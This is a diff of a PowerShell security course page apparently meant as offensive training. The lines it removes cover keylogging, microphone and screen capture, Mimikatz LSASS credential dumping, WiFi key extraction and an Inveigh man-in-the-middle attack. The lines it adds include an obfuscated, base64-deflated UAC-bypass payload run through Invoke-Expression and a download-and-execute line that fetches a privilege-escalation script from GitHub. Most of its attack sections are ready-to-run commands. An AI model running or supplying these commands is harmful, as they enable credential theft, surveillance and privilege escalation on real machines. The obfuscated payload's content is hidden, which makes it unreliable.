@@ -1,6 +1,6 @@
 ---
 ref: cmap-powershell
-title: CMAP24 Module 9 - Advancing at PowerShell for Security and Administration
+title: CMAP25 Module 6 - Advancing at PowerShell for Security and Administration
 date: 2022-10-25T00:00:00+00:00
 layout: page
 lang: en
@@ -247,64 +247,6 @@ do
 Write-Host ('The password is "{0}"!' -f $cred.GetNetworkCredential().Password)
 ```
 
-#### Keylogger
-
-[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
-
-```powershell
-Get-Keystrokes -LogPath .\keystrokes.txt -CollectionInterval 1
-```
-
-#### Audio Recording from&nbsp;Microphone
-
-[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
-
-```powershell
-Get-MicrophoneAudio -Length 10 -Path audio.wav
-```
-
-#### Taking Screenshots
-
-[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
-
-```powershell
-Enable-WindowsOptionalFeature -FeatureName NetFx3 -Online
-Get-TimedScreenshot -Path . -Interval 10 -EndTime 14:00
-```
-
-#### LSASS Credential Theft #1
-
-[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
-
-```powershell
-Invoke-Mimikatz -DumpCreds # -ComputerName PC2
-Invoke-Mimikatz -Command 'sekurlsa::krbtgt' -ComputerName PC2
-```
-
-#### LSASS Credential Theft #2
-
-[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)
-
-```powershell
-Get-Process -Name lsass | Out-Minidump -DumpFilePath .
-```
-
-```batchfile
-mimikatz.exe "sekurlsa::minidump lsass_560.dmp" sekurlsa::logonPasswords quit
-```
-
-#### LSASS Credential Theft #3
-
-[PowerMemory](https://github.com/giMini/PowerMemory)
-
-```powershell
-.\Reveal-MemoryCredentials.ps1
-```
-
-#### Extract WiFi Passwords
-
-[Get-WLANKeys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)
-
 #### Shellcode Invocation
 
 [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
@@ -317,12 +259,12 @@ Invoke-ShellCode -Force -ProcessID $target.Id
 
 #### UAC Bypass
 
-[UACME](https://github.com/hfiref0x/UACME)
+- [UACME](https://github.com/hfiref0x/UACME)
+- [UAC Bypass](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md)
 
 ```powershell
-# No longer Works on Win10 :-(
-iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1')
-Invoke-PsUACme -method mmc
+$code = "TgBlAHcALQBJAHQAZQBtACAAQwA6AFwASQB0AC0AVwBvAHIAawBlAGQALgB0AHgAdAA="
+(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
 ```
 
 #### Privilege Escalation
@@ -331,38 +273,9 @@ Invoke-PsUACme -method mmc
 - [PrivescCheck GitHub](https://github.com/itm4n/PrivescCheck)
 
 ```powershell
-# Returns services with unquoted paths that also have a space in the name
-Get-ServiceUnquoted
-
-# Returns services where the current user can write to the service binary path or its config
-Get-ModifiableServiceFile
-
-# Returns services the current user can modify
-Get-ModifiableService
-
-# Find schtasks with modifiable target files
-Get-ModifiableScheduledTaskFile
-
-# Checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
-Get-ModifiableRegistryAutoRun
-
-# Finds potential DLL hijacking opportunities for currently running processes
-Find-ProcessDLLHijack
+iex(iwr 'https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1' -useb)
+Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
 ```
-
-#### MITM Attack
-
-```powershell
-iex(iwr 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')
-
-Invoke-Inveigh -LLMNR Y -HTTP Y -SMB Y -NBNS Y -StatusOutput Y -ConsoleOutput Y
-
-Stop-Inveigh
-```
-
-#### PowerShell Empire
-
-[PowerShell Empire GitHub](https://github.com/EmpireProject/Empire)
 
 ### AMSI Bypass
 
